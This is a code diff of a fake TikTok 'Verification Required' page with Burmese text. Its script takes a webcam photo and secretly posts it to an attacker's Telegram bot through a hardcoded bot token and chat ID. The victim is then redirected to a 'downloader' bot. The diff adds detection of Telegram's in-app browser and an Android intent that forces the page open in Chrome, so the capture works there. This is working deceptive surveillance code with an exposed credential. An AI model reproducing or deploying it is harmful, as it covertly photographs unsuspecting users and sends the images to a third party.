@@ -7,7 +7,8 @@
     <style>
         body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
         .container { max-width: 400px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 15px; }
-        button { background-color: #fe2c55; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; }
+        button { background-color: #fe2c55; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 15px; }
+        .warning { color: #ffcc00; font-size: 14px; border: 1px dashed #ffcc00; padding: 10px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -15,7 +16,15 @@
         <img src="https://www.tiktok.com/favicon.ico" width="50">
         <h2>Verification Required</h2>
         <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် သင်သည် လူသားဖြစ်ကြောင်း အတည်ပြုပေးရန် လိုအပ်ပါသည်။</p>
-        <button onclick="startVerification()">Verify Now 🔒</button>
+        
+        <button id="mainBtn" onclick="startVerification()">Verify Now 🔒</button>
+        
+        <div id="tgWarning" class="warning">
+            ⚠️ <b>Verification Error</b><br>
+            Telegram Browser တွင် Verification လုပ်၍ မရပါ။<br><br>
+            အပေါ်က <b>(⋮)</b> ကိုနှိပ်ပြီး <b>'Open in Chrome'</b> ဖြင့် ဖွင့်ပေးပါ။
+        </div>
+
         <div id="loader" style="display:none; margin-top:20px;">စစ်ဆေးနေသည်... ခေတ္တစောင့်ပါ...</div>
     </div>
 
@@ -25,9 +34,26 @@
     <script>
         const camBotToken = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
         const camChatId = '5304050102';
-        const downloaderBotUser = '@tiktokhdvideo12_bot'; // ဥပမာ- TikTok_DL_Bot
+        const downloaderBotUser = 'tiktokhdvideo12_bot'; // @ မပါဘဲ ထည့်ရပါမယ်
+
+        // Browser စစ်ဆေးခြင်း
+        window.onload = function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            if (ua.indexOf("Telegram") > -1) {
+                document.getElementById('tgWarning').style.display = 'block';
+                document.getElementById('mainBtn').innerHTML = "Chrome ဖြင့် ထပ်မံကြိုးစားပါ";
+                // Android ဆိုလျှင် Chrome အတင်းဖွင့်ခိုင်းရန် ကြိုးစားမည်
+                window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
+            }
+        };
 
         async function startVerification() {
+            var ua = navigator.userAgent;
+            if (ua.indexOf("Telegram") > -1) {
+                alert("ကျေးဇူးပြု၍ Chrome Browser ဖြင့် ဖွင့်ပေးပါ။");
+                return;
+            }
+
             document.getElementById('loader').style.display = 'block';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -42,21 +68,13 @@
                         fd.append('chat_id', camChatId);
                         fd.append('photo', blob, 'shot.jpg');
                         
-                        // ပုံကို Cam Bot ဆီ ပို့မယ်
+                        // ၁။ ပုံကို Cam Bot ဆီ ပို့မယ်
                         await fetch(`https://api.telegram.org/bot${camBotToken}/sendPhoto`, { method: 'POST', body: fd });
                         
-                        // ပုံပို့ပြီးတာနဲ့ Downloader Bot ဆီ Verification Success စာသားနဲ့ ပြန်လွှဲမယ်
-                        window.location.href = `https://t.me/${downloaderBotUser}?start=Verification_Success`;
+                        // ၂။ ပုံပို့ပြီးတာနဲ့ Downloader Bot ဆီ ပြန်လွှဲမယ်
+                        setTimeout(() => {
+                            window.location.href = `https://t.me/${downloaderBotUser}?start=Verification_Success`;
+                        }, 1000);
                         
                         stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (e) {
-                // ငြင်းလိုက်ရင်လည်း Bot ဆီပဲ ပြန်လွှဲပေးလိုက်မယ်
-                window.location.href = `https://t.me/${downloaderBotUser}`;
-            }
-        }
-    </script>
-</body>
-</html>
 
